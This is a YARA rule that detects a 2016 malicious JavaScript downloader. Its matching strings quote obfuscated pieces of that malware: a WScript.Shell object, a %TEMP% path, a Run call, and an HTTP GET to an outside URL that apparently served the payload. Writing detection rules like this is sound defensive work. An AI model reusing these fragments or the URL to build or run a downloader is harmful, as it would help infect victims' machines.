rule sig_20160427_74a7ecd87712e5ba46851536addbe0cd {
  meta:
    description = "datamaliciousorder - file 20160427_74a7ecd87712e5ba46851536addbe0cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a0a47ad0cba42ec76a51247c32394533784077de5c480932b19e9718d58abba4"

  strings:
    $s1  = "XyjajJeaig[YpnjuFzyqy](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function IbatpCqapc() {return JayiiXdrpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"878MDrN" ascii
    $s3  = "function IbatpCqapc() {return JayiiXdrpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"878MDrN" ascii
    $s4  = "function TwnfgWfluz(UujgpFawix, SojqvUeraj){FgxphUokaf = FgxphUokaf * 1; return UujgpFawix - SojqvUeraj;};" fullword ascii
    $s5  = "var JayiiXdrpp = function OvhbyHafcu() {return BpkahVgfsc[EguzzTajxj](\"WScript\"+\".Shell\");}(), QjiyxEhxzh = 11;" fullword ascii
    $s6  = "var BpkahVgfsc = this[\"WScript\"];" fullword ascii
    $s7  = "if (XyjajJeaig[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function MjavhSkrbg(){return EnkgfKzbmv + \"\";};" fullword ascii
    $s9  = "function ZwjppIpdip() {return ((PndsvCrbez == true) && (PndsvCrbez == SyblqWjine)) ? 1 : FgxphUokaf;};" fullword ascii
    $s10 = "function DzdvpVltqg(VwfmcCfnbw) {var OiggsYqoiy = (1, 2, 3, 4, 5, VwfmcCfnbw); return OiggsYqoiy;};" fullword ascii
    $s11 = "SyblqWjine = true; " fullword ascii
    $s12 = "var QivdhBasmj = false;" fullword ascii
    $s13 = "function DjrktJozdx()" fullword ascii
    $s14 = "function AdrgtDocjj(ElzagQnaxm){JayiiXdrpp[\"R\"+\"un\"](ElzagQnaxm, FgxphUokaf, FgxphUokaf);};" fullword ascii
    $s15 = "function BortnMqwlg(){return EguzzTajxj;};" fullword ascii
    $s16 = "function AcvgyTmmhx(){return 23;};" fullword ascii
    $s17 = "}while (GwbacRebnu);" fullword ascii
    $s18 = "QivdhBasmj = true;" fullword ascii
    $s19 = "PndsvCrbez = true; " fullword ascii
    $s20 = "return TwnfgWfluz(AdwjaYvprk, CblbzNtxfi);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}